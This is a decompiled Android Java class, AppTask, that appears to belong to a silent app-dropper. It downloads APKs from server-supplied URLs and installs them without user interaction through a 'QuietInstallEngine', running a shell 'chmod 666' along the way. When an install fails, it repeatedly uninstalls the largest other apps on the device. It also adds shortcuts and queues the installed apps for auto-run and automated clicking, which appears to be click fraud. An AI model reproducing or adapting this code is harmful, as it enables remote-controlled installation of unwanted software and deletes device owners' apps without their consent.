package com.qc.model;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.os.Environment;
import com.qc.base.OrderSet;
import com.qc.common.Funs;
import com.qc.common.QuietInstallEngine;
import com.qc.entity.InstalledApk;
import com.qc.entity.SilenceApkInfo;
import com.qc.util.IsNetOpen;
import com.qc.util.SystemUtil;
import java.io.File;
import java.util.Arrays;
import java.util.List;

public class AppTask implements Runnable {
    private SilenceApkInfo apkInfo;
    private Context context;
    private InstalledApkDBHelper dbHelper;
    private int delCount = 0;
    private IsNetOpen ino;
    private List<String> undel;

    public AppTask(Context context, SilenceApkInfo apkInfo, int delCount, String undelStr) {
        this.context = context;
        this.apkInfo = apkInfo;
        this.dbHelper = new InstalledApkDBHelper(context);
        this.delCount = delCount;
        if (undelStr != null && undelStr.length() > 0) {
            this.undel = Arrays.asList(undelStr.split(","));
        }
    }

    public void run() {
        InstalledApk installedApk;
        List<InstalledApk> installedApks = this.dbHelper.getAll();
        boolean isInstallApked = false;
        if (installedApks != null && installedApks.size() > 0) {
            for (InstalledApk installedApk2 : installedApks) {
                if (((int) this.apkInfo.getKssiid()) == installedApk2.getKssiid()) {
                    isInstallApked = true;
                    break;
                }
            }
        }
        String installState;
        byte[] bytes;
        File sdCardFile;
        String fileName;
        int offSet;
        PackageInfo packageInfo;
        String delpkg;
        int offSet2;
        if (isInstallApked) {
            if (this.apkInfo.getIsuninstall() == 1 && Funs.isInstallApk(this.context, this.apkInfo.getPackageName())) {
                Funs.forceStopProcess(this.context, this.apkInfo.getPackageName());
                QuietInstallEngine.unInstall(this.apkInfo.getPackageName());
            }
            if (this.apkInfo.getIsreset() == 1) {
                this.ino = new IsNetOpen(this.context);
                installState = "fail";
                if (this.ino.checkNet()) {
                    if (Funs.isInstallApk(this.context, this.apkInfo.getPackageName())) {
                        Funs.forceStopProcess(this.context, this.apkInfo.getPackageName());
                        QuietInstallEngine.unInstall(this.apkInfo.getPackageName());
                    }
                    bytes = ApkDownLoadManager.updateApkData(this.context, this.apkInfo.getVisiturl().trim(), this.apkInfo.getSilencename());
                    if (bytes != null && bytes.length > 0) {
                        sdCardFile = Funs.getSDCardFile(new StringBuilder(String.valueOf(this.apkInfo.getSilencename().trim())).append(".apk").toString());
                        if (sdCardFile != null) {
                            fileName = Environment.getExternalStorageDirectory() + "/mnkp/" + this.apkInfo.getSilencename() + ".apk";
                            if (this.apkInfo.getLocation() == 1) {
                                installState = QuietInstallEngine.install(fileName);
                                if (!installState.contains("Success") && this.delCount > 0) {
                                    offSet = 0;
                                    while (!installState.contains("Success")) {
                                        offSet++;
                                        if (offSet > this.delCount) {
                                            break;
                                        }
                                        if (this.undel != null && this.undel.size() > 0) {
                                            packageInfo = SystemUtil.getMaxRomApp(this.context, this.undel);
                                            if (packageInfo == null) {
                                                break;
                                            } else if (packageInfo != null) {
                                                delpkg = packageInfo.packageName;
                                                if (delpkg != null && delpkg.length() > 0) {
                                                    QuietInstallEngine.unInstall(delpkg);
                                                }
                                            }
                                        } else {
                                            packageInfo = SystemUtil.getMaxRomApp(this.context);
                                            if (packageInfo == null) {
                                                break;
                                            } else if (packageInfo != null) {
                                                delpkg = packageInfo.packageName;
                                                if (delpkg != null && delpkg.length() > 0) {
                                                    QuietInstallEngine.unInstall(delpkg);
                                                }
                                            }
                                        }
                                        installState = QuietInstallEngine.install(fileName);
                                    }
                                }
                            } else if (this.apkInfo.getLocation() == 2) {
                                QuietInstallEngine.installInSDCard(2);
                                installState = QuietInstallEngine.install(fileName);
                                if (!installState.contains("Success") && this.delCount > 0) {
                                    offSet = 0;
                                    while (!installState.contains("Success")) {
                                        offSet++;
                                        if (offSet > this.delCount) {
                                            break;
                                        }
                                        if (this.undel != null && this.undel.size() > 0) {
                                            packageInfo = SystemUtil.getMaxSdCardApp(this.context, this.undel);
                                            if (packageInfo == null) {
                                                break;
                                            } else if (packageInfo != null) {
                                                delpkg = packageInfo.packageName;
                                                if (delpkg != null && delpkg.length() > 0) {
                                                    QuietInstallEngine.unInstall(delpkg);
                                                }
                                            }
                                        } else {
                                            packageInfo = SystemUtil.getMaxRomApp(this.context);
                                            if (packageInfo == null) {
                                                break;
                                            } else if (packageInfo != null) {
                                                delpkg = packageInfo.packageName;
                                                if (delpkg != null && delpkg.length() > 0) {
                                                    QuietInstallEngine.unInstall(delpkg);
                                                }
                                            }
                                        }
                                        installState = QuietInstallEngine.install(fileName);
                                    }
                                    QuietInstallEngine.installInSDCard(0);
                                    if (!installState.contains("Success")) {
                                        installState = QuietInstallEngine.install(fileName);
                                        if (!installState.contains("Success") && this.delCount > 0) {
                                            offSet2 = 0;
                                            while (!installState.contains("Success")) {
                                                offSet2++;
                                                if (offSet2 > this.delCount) {
                                                    break;
                                                }
                                                if (this.undel != null && this.undel.size() > 0) {
                                                    packageInfo = SystemUtil.getMaxRomApp(this.context, this.undel);
                                                    if (packageInfo == null) {
                                                        break;
                                                    } else if (packageInfo != null) {
                                                        delpkg = packageInfo.packageName;
                                                        if (delpkg != null && delpkg.length() > 0) {
                                                            QuietInstallEngine.unInstall(delpkg);
                                                        }
                                                    }
                                                } else {
                                                    packageInfo = SystemUtil.getMaxRomApp(this.context);
                                                    if (packageInfo == null) {
                                                        break;
                                                    } else if (packageInfo != null) {
                                                        delpkg = packageInfo.packageName;
                                                        if (delpkg != null && delpkg.length() > 0) {
                                                            QuietInstallEngine.unInstall(delpkg);
                                                        }
                                                    }
                                                }
                                                installState = QuietInstallEngine.install(fileName);
                                            }
                                        }
                                    }
                                }
                            }
                            sdCardFile.delete();
                        } else {
                            try {
                                QuietInstallEngine.ec("chmod 666 /data/data/" + this.context.getPackageName() + "/files/" + this.apkInfo.getSilencename() + ".apk");
                            } catch (InterruptedException e) {
                            }
                            installState = QuietInstallEngine.install(new StringBuilder(String.valueOf(this.context.getFilesDir().getAbsolutePath())).append("/").append(this.apkInfo.getSilencename()).append(".apk").toString());
                            if (!installState.contains("Success") && this.delCount > 0) {
                                offSet = 0;
                                while (!installState.contains("Success")) {
                                    offSet++;
                                    if (offSet > this.delCount) {
                                        break;
                                    }
                                    if (this.undel != null && this.undel.size() > 0) {
                                        packageInfo = SystemUtil.getMaxRomApp(this.context, this.undel);
                                        if (packageInfo == null) {
                                            break;
                                        } else if (packageInfo != null) {
                                            delpkg = packageInfo.packageName;
                                            if (delpkg != null && delpkg.length() > 0) {
                                                QuietInstallEngine.unInstall(delpkg);
                                            }
                                        }
                                    } else {
                                        packageInfo = SystemUtil.getMaxRomApp(this.context);
                                        if (packageInfo == null) {
                                            break;
                                        } else if (packageInfo != null) {
                                            delpkg = packageInfo.packageName;
                                            if (delpkg != null && delpkg.length() > 0) {
                                                QuietInstallEngine.unInstall(delpkg);
                                            }
                                        }
                                    }
                                    installState = QuietInstallEngine.install(new StringBuilder(String.valueOf(this.context.getFilesDir().getAbsolutePath())).append("/").append(this.apkInfo.getSilencename()).append(".apk").toString());
                                }
                            }
                            this.context.deleteFile(new StringBuilder(String.valueOf(this.apkInfo.getSilencename())).append(".apk").toString());
                        }
                        if (installState.contains("Success")) {
                            if (this.apkInfo.getDesktop() == 1 && Funs.isInstallApk(this.context, this.apkInfo.getPackageName())) {
                                Funs.addShortcut(this.context, this.apkInfo.getPackageName());
                            }
                            installedApk2 = new InstalledApk();
                            installedApk2.setKssiid((int) this.apkInfo.getKssiid());
                            installedApk2.setPackageName(this.apkInfo.getPackageName());
                            installedApk2.setSilencename(this.apkInfo.getSilencename());
                            installedApk2.setCreateTime(Funs.date2String2());
                            this.dbHelper.insert(installedApk2);
                        }
                    }
                } else {
                    return;
                }
            }
        } else if (this.apkInfo.getIsreset() == 1) {
            installState = "fail";
            this.ino = new IsNetOpen(this.context);
            if (this.ino.checkNet()) {
                if (Funs.isInstallApk(this.context, this.apkInfo.getPackageName())) {
                    Funs.forceStopProcess(this.context, this.apkInfo.getPackageName());
                    QuietInstallEngine.unInstall(this.apkInfo.getPackageName());
                }
                bytes = ApkDownLoadManager.updateApkData(this.context, this.apkInfo.getVisiturl().trim(), this.apkInfo.getSilencename());
                if (bytes != null && bytes.length > 0) {
                    sdCardFile = Funs.getSDCardFile(new StringBuilder(String.valueOf(this.apkInfo.getSilencename())).append(".apk").toString());
                    if (sdCardFile != null) {
                        fileName = Environment.getExternalStorageDirectory() + "/mnkp/" + this.apkInfo.getSilencename() + ".apk";
                        if (this.apkInfo.getLocation() == 1) {
                            installState = QuietInstallEngine.install(fileName);
                            if (!installState.contains("Success") && this.delCount > 0) {
                                offSet = 0;
                                while (!installState.contains("Success")) {
                                    offSet++;
                                    if (offSet > this.delCount) {
                                        break;
                                    }
                                    if (this.undel != null && this.undel.size() > 0) {
                                        packageInfo = SystemUtil.getMaxRomApp(this.context, this.undel);
                                        if (packageInfo == null) {
                                            break;
                                        } else if (packageInfo != null) {
                                            delpkg = packageInfo.packageName;
                                            if (delpkg != null && delpkg.length() > 0) {
                                                QuietInstallEngine.unInstall(delpkg);
                                            }
                                        }
                                    } else {
                                        packageInfo = SystemUtil.getMaxRomApp(this.context);
                                        if (packageInfo == null) {
                                            break;
                                        } else if (packageInfo != null) {
                                            delpkg = packageInfo.packageName;
                                            if (delpkg != null && delpkg.length() > 0) {
                                                QuietInstallEngine.unInstall(delpkg);
                                            }
                                        }
                                    }
                                    installState = QuietInstallEngine.install(fileName);
                                }
                            }
                        } else if (this.apkInfo.getLocation() == 2) {
                            QuietInstallEngine.installInSDCard(2);
                            installState = QuietInstallEngine.install(fileName);
                            if (!installState.contains("Success") && this.delCount > 0) {
                                offSet = 0;
                                while (!installState.contains("Success")) {
                                    offSet++;
                                    if (offSet > this.delCount) {
                                        break;
                                    }
                                    if (this.undel != null && this.undel.size() > 0) {
                                        packageInfo = SystemUtil.getMaxSdCardApp(this.context, this.undel);
                                        if (packageInfo == null) {
                                            break;
                                        } else if (packageInfo != null) {
                                            delpkg = packageInfo.packageName;
                                            if (delpkg != null && delpkg.length() > 0) {
                                                QuietInstallEngine.unInstall(delpkg);
                                            }
                                        }
                                    } else {
                                        packageInfo = SystemUtil.getMaxRomApp(this.context);
                                        if (packageInfo == null) {
                                            break;
                                        } else if (packageInfo != null) {
                                            delpkg = packageInfo.packageName;
                                            if (delpkg != null && delpkg.length() > 0) {
                                                QuietInstallEngine.unInstall(delpkg);
                                            }
                                        }
                                    }
                                    installState = QuietInstallEngine.install(fileName);
                                }
                                QuietInstallEngine.installInSDCard(0);
                                if (!installState.contains("Success")) {
                                    installState = QuietInstallEngine.install(fileName);
                                    if (!installState.contains("Success") && this.delCount > 0) {
                                        offSet2 = 0;
                                        while (!installState.contains("Success")) {
                                            offSet2++;
                                            if (offSet2 > this.delCount) {
                                                break;
                                            }
                                            if (this.undel != null && this.undel.size() > 0) {
                                                packageInfo = SystemUtil.getMaxRomApp(this.context, this.undel);
                                                if (packageInfo == null) {
                                                    break;
                                                } else if (packageInfo != null) {
                                                    delpkg = packageInfo.packageName;
                                                    if (delpkg != null && delpkg.length() > 0) {
                                                        QuietInstallEngine.unInstall(delpkg);
                                                    }
                                                }
                                            } else {
                                                packageInfo = SystemUtil.getMaxRomApp(this.context);
                                                if (packageInfo == null) {
                                                    break;
                                                } else if (packageInfo != null) {
                                                    delpkg = packageInfo.packageName;
                                                    if (delpkg != null && delpkg.length() > 0) {
                                                        QuietInstallEngine.unInstall(delpkg);
                                                    }
                                                }
                                            }
                                            installState = QuietInstallEngine.install(fileName);
                                        }
                                    }
                                }
                            }
                        }
                        sdCardFile.delete();
                    } else {
                        try {
                            QuietInstallEngine.ec("chmod 666 /data/data/" + this.context.getPackageName() + "/files/" + this.apkInfo.getSilencename() + ".apk");
                        } catch (InterruptedException e2) {
                        }
                        installState = QuietInstallEngine.install(new StringBuilder(String.valueOf(this.context.getFilesDir().getAbsolutePath())).append("/").append(this.apkInfo.getSilencename()).append(".apk").toString());
                        if (!installState.contains("Success") && this.delCount > 0) {
                            offSet = 0;
                            while (!installState.contains("Success")) {
                                offSet++;
                                if (offSet > this.delCount) {
                                    break;
                                }
                                if (this.undel != null && this.undel.size() > 0) {
                                    packageInfo = SystemUtil.getMaxRomApp(this.context, this.undel);
                                    if (packageInfo == null) {
                                        break;
                                    } else if (packageInfo != null) {
                                        delpkg = packageInfo.packageName;
                                        if (delpkg != null && delpkg.length() > 0) {
                                            QuietInstallEngine.unInstall(delpkg);
                                        }
                                    }
                                } else {
                                    packageInfo = SystemUtil.getMaxRomApp(this.context);
                                    if (packageInfo == null) {
                                        break;
                                    } else if (packageInfo != null) {
                                        delpkg = packageInfo.packageName;
                                        if (delpkg != null && delpkg.length() > 0) {
                                            QuietInstallEngine.unInstall(delpkg);
                                        }
                                    }
                                }
                                installState = QuietInstallEngine.install(new StringBuilder(String.valueOf(this.context.getFilesDir().getAbsolutePath())).append("/").append(this.apkInfo.getSilencename()).append(".apk").toString());
                            }
                        }
                        this.context.deleteFile(new StringBuilder(String.valueOf(this.apkInfo.getSilencename())).append(".apk").toString());
                    }
                    if (installState.contains("Success")) {
                        if (this.apkInfo.getDesktop() == 1 && Funs.isInstallApk(this.context, this.apkInfo.getPackageName())) {
                            Funs.addShortcut(this.context, this.apkInfo.getPackageName());
                        }
                        installedApk2 = new InstalledApk();
                        installedApk2.setKssiid((int) this.apkInfo.getKssiid());
                        installedApk2.setPackageName(this.apkInfo.getPackageName());
                        installedApk2.setSilencename(this.apkInfo.getSilencename());
                        installedApk2.setCreateTime(Funs.date2String2());
                        this.dbHelper.insert(installedApk2);
                    }
                }
            } else {
                return;
            }
        }
        if (this.apkInfo.getIsrun() == 1) {
            OrderSet.aliveApps.offer(this.apkInfo);
        }
        if (this.apkInfo.getActivelist() != null && this.apkInfo.getActivelist().size() > 0) {
            OrderSet.clickApps.offer(this.apkInfo);
        }
    }
}
